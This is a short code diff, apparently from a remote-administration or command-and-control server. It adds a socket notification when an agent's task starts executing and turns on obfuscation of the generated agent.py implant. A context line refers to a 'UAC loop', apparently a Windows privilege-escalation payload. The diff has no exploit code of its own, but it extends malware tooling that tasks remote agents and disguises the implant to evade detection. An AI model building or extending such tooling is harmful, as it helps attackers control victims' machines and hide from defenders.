@@ -727,6 +727,13 @@ def init_api_routes(app, socketio):
 
             if task:
                 c.execute("UPDATE tasks SET status='executing' WHERE id=?", (task[0],))
+                
+                # Notify clients that task is now executing
+                socketio.emit('task_executing', {
+                    'task_id': task[0],
+                    'agent_id': data['agent_id']
+                })
+
                 response = {
                     'task_id': task[0],
                     'type': task[1],
@@ -1577,7 +1584,7 @@ result = "UAC loop started"
             )
 
             # Apply obfuscation
-            #agent_code = _obfuscate_code(agent_code)
+            agent_code = _obfuscate_code(agent_code)
 
             agent_path = os.path.join(agents_dir, 'agent.py')
             with open(agent_path, 'w') as f:
